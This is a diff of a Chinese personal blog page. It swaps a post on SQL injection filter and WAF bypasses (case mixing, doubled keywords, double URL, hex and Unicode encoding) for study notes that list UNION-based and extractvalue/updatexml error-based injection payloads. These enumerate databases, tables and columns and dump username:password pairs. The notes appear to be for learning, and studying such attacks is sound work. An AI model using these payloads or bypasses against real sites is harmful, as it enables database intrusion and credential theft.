@@ -10,7 +10,7 @@
     
     
     
-    <title>SQL注入绕过 | Hexo</title>
+    <title>sql注入基本笔记_1 | Hexo</title>
     <link href="https://Edmund0A.github.io" rel="prefetch" />
 
     
@@ -156,19 +156,19 @@
         <i class="fa fa-home"></i>
         <a href="https://Edmund0A.github.io">Hexo</a>
         >
-        <span>SQL注入绕过</span>
+        <span>sql注入基本笔记_1</span>
     </div>
     <!-- 大型设备详细文章 -->
     <div class="hidden-xs">
         <div class="title-article">
             <h1>
-                <a href="/2020/07/26/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87/">SQL注入绕过</a>
+                <a href="/2020/08/08/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E7%AC%94%E8%AE%B0_1/">sql注入基本笔记_1</a>
             </h1>
         </div>
         <div class="tag-article">
             
             <span class="label label-gal">
-                <i class="fa fa-calendar"></i> 2020-07-26
+                <i class="fa fa-calendar"></i> 2020-08-08
             </span>
             
         </div>
@@ -178,11 +178,11 @@
         <center>
             <div class="title-article">
                 <h4>
-                    <a href="/2020/07/26/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87/">SQL注入绕过</a>
+                    <a href="/2020/08/08/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E7%AC%94%E8%AE%B0_1/">sql注入基本笔记_1</a>
                 </h4>
             </div>
             <p>
-                <i class="fa fa-calendar"></i> 2020-07-26
+                <i class="fa fa-calendar"></i> 2020-08-08
             </p>
             <p>
                 
@@ -191,28 +191,51 @@
         </center>
     </div>
     <div class="content-article">
-        <p>🔺⚪▲</p>
-<h1 id="🔺-关键字的绕过"><a href="#🔺-关键字的绕过" class="headerlink" title="🔺 关键字的绕过"></a>🔺 关键字的绕过</h1><h2 id="⚪-过滤"><a href="#⚪-过滤" class="headerlink" title="⚪ 过滤"></a>⚪ 过滤</h2><p>如对and进行过滤，可以尝试：<br>▲ 对于and,or的绕过可以尝试一下&amp;&amp;,||,异或特殊符号注入<br>▲ 使用注释符绕过，比如: <code>/*!and*/ uni/**/on se/**/lect</code><br>▲ 大小写绕过: <code>ANd UniOn SeleCt</code><br>▲ 双关键字绕过: <code>ununionion seselectlect</code><br>▲ 关键字替换（在关键字中间可插入将会被WAF过滤的字符） – 例如SELECT可插入变成a&lt;nd，一旦插入字符被过滤，&lt;它将作为and传递。<br>空格代替：<code>+ %20 %09 %0a %0b %0c %0d %a0 %00 /**/ /!/</code></p>
-<h2 id="⚪-大小写混合"><a href="#⚪-大小写混合" class="headerlink" title="⚪ 大小写混合"></a>⚪ 大小写混合</h2><p>如果正则表达式只针对小写或大写的关键字进行匹配处理，根据数据库以不区分大小写的方式处理SQL关键字的特性，改变大小写。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//mp.csdn.net/index.php?id=-15 uNIoN sELecT 1,2,3,4</span></span><br></pre></td></tr></table></figure>
-<h2 id="⚪-替换关键字"><a href="#⚪-替换关键字" class="headerlink" title="⚪ 替换关键字"></a>⚪ 替换关键字</h2><p>这种情况下大小写转化无法进行绕过而且正则表达式会替换或删除select、union这些关键字，可以先摸清楚后台的过滤机制，针对正则过滤进行利用，如果select、union这些关键字只匹配一次就可以利用双写关键字进行绕过。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//mp.csdn.net/index.php?id=-15  UNIunionON SELselectECT 1,2,3,4</span></span><br></pre></td></tr></table></figure>
-<h2 id="⚪-使用编码"><a href="#⚪-使用编码" class="headerlink" title="⚪ 使用编码"></a>⚪ 使用编码</h2><h3 id="▲-URL编码"><a href="#▲-URL编码" class="headerlink" title="▲ URL编码"></a>▲ URL编码</h3><p>如在Chrome中输入一个链接非保留字的字符浏览器会对其URL编码如<code>空格变为%20、单引号%27、左括号%28、右括号%29</code>。<br>普通的URL编码可能无法实现绕过，不过存在某种情况比如URL编码只进行了一次解码过滤，那么这时候就可以用两次URL编码进行绕过。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">未编码前：?id=<span class="number">-1</span><span class="string">' UNION SELECT 1,2,3,4 --+#</span></span><br></pre></td></tr></table></figure>
+        <h1 id="union-联合查询"><a href="#union-联合查询" class="headerlink" title="union 联合查询"></a>union 联合查询</h1><p>🔺查询当前数据库名<br>报错的语法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">（如and1=<span class="number">2</span>）+ union select <span class="number">1</span>,database()</span><br></pre></td></tr></table></figure>
 
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">一次编码后：?id=<span class="number">-1</span>%<span class="number">27</span>%<span class="number">20</span>UNION%<span class="number">20</span>SELECT%<span class="number">201</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>%<span class="number">20</span>--+<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+<p>🔺查询当前数据库版本</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select <span class="number">1</span>,version()</span><br></pre></td></tr></table></figure>
 
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">二次编码后：?id=<span class="number">-1</span>%<span class="number">2527</span>%<span class="number">2520</span>UNION%<span class="number">2520</span>SELECT%<span class="number">25201</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>%<span class="number">2520</span>--+<span class="comment">#</span></span><br></pre></td></tr></table></figure>
-<h3 id="▲-十六进制编码"><a href="#▲-十六进制编码" class="headerlink" title="▲ 十六进制编码"></a>▲ 十六进制编码</h3><p>对后台针对单引号或者关键字进行处理，就可以使用16进制，把 <strong>‘glbimreb21’</strong> 变为 <strong>0x676c62696d7265623231</strong>,就可不需要单引号包裹着变量进行简单的绕过了，<em>在用 16进制进行绕过时，16进制前面要加0x</em>。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">转换前：?id=<span class="number">-55</span><span class="string">' union%20select%201,group_concat(table_name),3 from information_schema.tables where table_schema='</span>glbimreb21<span class="string">' --+</span></span><br></pre></td></tr></table></figure>
+<p>🔺查询当前数据库 表名</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select <span class="number">1</span>,table_name from information_schema.tables where table_schema=database() limit <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
 
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">转换后：?id=<span class="number">-55</span><span class="string">' union%20select%201,group_concat(table_name),3 from information_schema.tables where table_schema=0x676c62696d7265623231--+</span></span><br></pre></td></tr></table></figure>
-<h3 id="▲-Unicode编码"><a href="#▲-Unicode编码" class="headerlink" title="▲ Unicode编码"></a>▲ Unicode编码</h3><p>Unicode是一种行业标准，它可以用不同的字符编码表示，Unicode有标准编码和非标准编码。常用的几个符号的一些Unicode编码<br>单引号：<code>%u0027、%u02b9、%u02bc、%u02c8、%u2032、%uff07、%c0%27、%c0%a7、%e0%80%a7</code><br>空格：<code>%u0020、%uff00、%c0%20、%c0%a0、%e0%80%a0</code><br>左括号：<code>%u0028、%uff08、%c0%28、%c0%a8、%e0%80%a8</code><br>右括号：<code>%u0029、%uff09、%c0%29、%c0%a9、%e0%80%a9</code><br>举例：</p>
-<ol>
-<li>**?id=10%D6’%20AND%201=2%23</li>
-<li>SELECT ‘Ä’=‘A’; #1**</li>
-</ol>
-<p>两个示例中，前者利用双字节绕过，对单引号转义操作变成’，就变成了%D6%5C’，%D6%5C构成了一个款字节即Unicode字节，单引号可以正常使用。<br>第二个示例使用的是两种不同编码的字符的比较，它们比较的结果可能是True或者False，关键在Unicode编码种类繁多，基于黑名单的过滤器无法处理所有情况，从而实现绕过。</p>
+<p>🔺查询当前数据库所有表，并且拼接在一行显示</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select <span class="number">1</span>,group_concat(table_name),<span class="number">3</span> from information_schema.tables where table_schema=database() --+</span><br></pre></td></tr></table></figure>
+
+<p>🔺查询当前数据库users中表所有字段，并且拼接在一行显示</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select <span class="number">1</span>,group_concat(column_name),<span class="number">3</span> from information_schema.columns where table_name=<span class="string">'users'</span> --+</span><br></pre></td></tr></table></figure>
+
+<p>🔺查询当前数据库users中表username和password字段中的信息，并且拼接在一行显示</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select <span class="number">1</span>,group_concat(username,<span class="number">0x3a</span>,password),<span class="number">3</span> from users--+</span><br></pre></td></tr></table></figure>
+
+<h1 id="联合查询报错型注入"><a href="#联合查询报错型注入" class="headerlink" title="联合查询报错型注入"></a>联合查询报错型注入</h1><p>🔺加单引号报错，然后在回显点显示当前数据库所有表，并且拼接在一行显示</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">' and 1=extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) --+</span></span><br></pre></td></tr></table></figure>
+
+<p>🔺爆字段</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">' and 1=extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='</span>users<span class="string">'))) --+</span></span><br></pre></td></tr></table></figure>
+
+<p>🔺爆值</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">' and 1=extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users)))--+</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="updatexml报错注入"><a href="#updatexml报错注入" class="headerlink" title="updatexml报错注入"></a>updatexml报错注入</h1><p>🔺爆数据库版本信息</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">' anandd（双写and绕过waf） updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1) --+</span></span><br></pre></td></tr></table></figure>
+
+<p>🔺链接用户</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(SELECT user()),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+<p>🔺爆库</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(SELECT distinct concat(<span class="number">0x7e</span>, (select schema_name),<span class="number">0x7e</span>) FROM admin limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+<p>🔺爆表</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(SELECT distinct concat(<span class="number">0x7e</span>, (select table_name),<span class="number">0x7e</span>) FROM admin limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>),<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>🔺爆字段</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(SELECT distinct concat(<span class="number">0x7e</span>, (select column_name),<span class="number">0x7e</span>) FROM admin limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+<p>🔺爆字段内容</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(SELECT distinct concat(<span class="number">0x23</span>,username,<span class="number">0x3a</span>,password,<span class="number">0x23</span>) FROM admin limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
 
     </div>
 </article>
@@ -223,7 +246,7 @@
 <script>
 	if(!window.commentConfig) {
       window.commentConfig = {}
-      window.commentConfig.title = 'SQL注入绕过'
+      window.commentConfig.title = 'sql注入基本笔记_1'
     }
 </script>
 
@@ -404,17 +427,17 @@
 
                 
                 <li>
-                    <a href="/2020/07/26/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87/index.html#sidebar-tags" data-toggle="tab" id="tags-tab">热门标签</a>
+                    <a href="/2020/08/08/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E7%AC%94%E8%AE%B0_1/index.html#sidebar-tags" data-toggle="tab" id="tags-tab">热门标签</a>
                 </li>
                 
                 
                 <li>
-                    <a href="/2020/07/26/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87/index.html#sidebar-friend-links" data-toggle="tab" id="friend-links-tab">友情链接</a>
+                    <a href="/2020/08/08/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E7%AC%94%E8%AE%B0_1/index.html#sidebar-friend-links" data-toggle="tab" id="friend-links-tab">友情链接</a>
                 </li>
                 
                 
                 <li>
-                    <a href="/2020/07/26/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87/index.html#sidebar-links" data-toggle="tab" id="links-tab">个人链接</a>
+                    <a href="/2020/08/08/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E7%AC%94%E8%AE%B0_1/index.html#sidebar-links" data-toggle="tab" id="links-tab">个人链接</a>
                 </li>
                 
             </ul>
@@ -536,7 +559,7 @@
 <script src="https://myau.moe/js/comment/gitment.browser.js"></script>
 <script>
     if(window.commentConfig) {
-      window.commentConfig.id = 'Sun Jul 26 2020 15:20:51 GMT+0800'
+      window.commentConfig.id = 'Sat Aug 08 2020 19:46:41 GMT+0800'
       window.commentConfig.owner = 'Edmund0A'
       window.commentConfig.repo = ''
       window.commentConfig.client_id = ''
@@ -544,7 +567,7 @@
       window.commentConfig.redirect_uri = ''
     } else {
       window.commentConfig = {
-      	id: 'Sun Jul 26 2020 15:20:51 GMT+0800',
+      	id: 'Sat Aug 08 2020 19:46:41 GMT+0800',
         owner: 'Edmund0A',
         repo: '',
         client_id: '',
